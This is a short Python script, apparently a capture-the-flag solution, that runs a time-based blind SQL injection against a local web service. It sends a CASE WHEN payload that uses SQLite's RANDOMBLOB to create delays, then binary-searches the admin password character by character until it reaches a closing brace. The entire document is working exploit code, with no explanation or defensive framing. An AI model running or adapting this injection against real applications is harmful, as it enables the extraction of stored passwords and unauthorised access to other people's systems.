import requests
import time

url = "http://127.0.0.1:30032"

res = ""
while True:
    s = 0
    e = 256
    while(s<=e):
        mid = (s+e)//2
        print(res+chr(mid))
        payload = f"' or CASE WHEN username='admin' and password>='{res+chr(mid)}' THEN 1 ELSE UPPER(HEX(RANDOMBLOB(1000000000/2))) END --"
    
        recent_time = time.time_ns()
        response = requests.get(url=url, params={"password":payload})
        print(time.time_ns() - recent_time)
        if time.time_ns() - recent_time > 1000000000:
            e = mid-1
        else: 
            s = mid+1
            
    if "Error" in response.text:
        mid -= 1
    res += chr(mid)
    
    if chr(mid) == "}":
        break
    print(res)
print(res)